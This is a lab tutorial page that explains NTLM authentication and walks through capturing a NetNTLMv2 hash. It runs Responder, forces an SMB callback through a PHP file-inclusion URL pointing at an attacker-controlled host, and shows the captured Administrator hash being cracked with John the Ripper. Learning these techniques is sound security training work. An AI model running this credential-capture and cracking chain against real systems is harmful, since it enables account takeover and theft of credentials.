[Home](../index.md)

# Using Responder To Grab NetNTLMv2 


---
## NTLM Authentication

First, a brief explanation of NTLM

1. The client sends a request to the server, containing a username and a domain (DOMAIN\username)

2. A random character string is generated by the server.  This string is known as the **Challenge**.  The server then sends the Challenge to the client machine.

3. The client takes the NTLM hash of the user's password, also known as the **NTHash**, and encrypts the Challenge string with the NTHash.  The client sends the encrypted data back to the server.

4. The server takes it's copy of the NTHash and encrypts the same Challenge string with it.  It then compares the result to the result received by the client.  If they are the same, the password was correct and the session is considered authenticated.


---
## Vulnerability

NTLM ensures that the NTHash or password is not sent across the network.  However, if both the Challenge string and the result of the Challenge encrypted by the NTHash are both known, it can be Brute-Forced.  If the password it guessed correctly, the result of encryption will be the same.

**NetNTLMv2** is what we call the Challenge and the result of the Challenge encrypted by the NTHash combined into one string.  This is the target, if we obtain this we have the means to brute the password.


---
## Demonstration


With Responder, we can start a server.  This will respond to SMB requests and show us the resulting NetNTLMv2.

```
└─$ sudo responder -I tun0
```

Next, we have to find a way to initiate contact with this server.  There are a number of ways this can happen, many examples are shown at [Hacktricks](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds)

Below is an example of using File Inclusion via the PHP `include()` function.

```
http://target.server/index.php?page=//10.10.14.4/somefile
```

If successful, the Responder session should show the hash.

```
[+] Listening for events...                                                    

/usr/share/responder/./Responder.py:366: DeprecationWarning: setDaemon() is deprecated, set the daemon attribute instead                                      
  thread.setDaemon(True)                                                       
/usr/share/responder/./Responder.py:256: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()                                    
  server.socket = ssl.wrap_socket(server.socket, certfile=cert, keyfile=key, server_side=True)                                                                
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.175.41                               
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator                            
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1000781f13c2b7bf:E23AE3FD4FCF176325B00ED0DDBF6264:010100000000000080A490826F6FD8012C1606CFDBFD2E9C0000000002000800310051003600340001001E00570049004E002D004E005A0046004200570034003400540053003100410004003400570049004E002D004E005A004600420057003400340054005300310041002E0031005100360034002E004C004F00430041004C000300140031005100360034002E004C004F00430041004C000500140031005100360034002E004C004F00430041004C000700080080A490826F6FD80106000400020000000800300030000000000000000100000000200000821518AFAA48F41DD51468CE3FC5DB124BDF7270EBBDBDF4F3053BE048F267880A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000   
```

We can then place this hash in a file and crack it with John The Ripper

```
└─$ echo "Administrator::RESPONDER:1000781f13c2b7bf:E23AE3FD4FCF176325B00ED0DDBF6264:010100000000000080A490826F6FD8012C1606CFDBFD2E9C0000000002000800310051003600340001001E00570049004E002D004E005A0046004200570034003400540053003100410004003400570049004E002D004E005A004600420057003400340054005300310041002E0031005100360034002E004C004F00430041004C000300140031005100360034002E004C004F00430041004C000500140031005100360034002E004C004F00430041004C000700080080A490826F6FD80106000400020000000800300030000000000000000100000000200000821518AFAA48F41DD51468CE3FC5DB124BDF7270EBBDBDF4F3053BE048F267880A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0034000000000000000000" > hash.txt
                                            
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt                           
Using default input encoding: UTF-8                                            
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads                                                      
Press 'q' or Ctrl-C to abort, almost any other key for status
badpassword        (Administrator)                                               
1g 0:00:00:00 DONE (2022-05-24 13:16) 100.0g/s 409600p/s 409600c/s 409600C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.    
```